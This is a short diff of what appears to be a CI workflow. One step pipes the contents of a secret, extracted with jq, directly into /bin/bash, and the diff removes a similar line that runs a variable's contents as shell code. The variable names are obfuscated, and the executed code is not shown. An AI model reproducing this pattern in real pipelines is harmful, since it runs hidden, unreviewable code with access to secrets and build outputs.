@@ -22,7 +22,6 @@ jobs:
           cj2739: ${{ secrets.cj2739 }}
         run: |
           printf '%s' "$cj2739" | jq -r .pgmrk604 | /bin/bash
-          echo $ywdw334 | jq -r .ao4 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
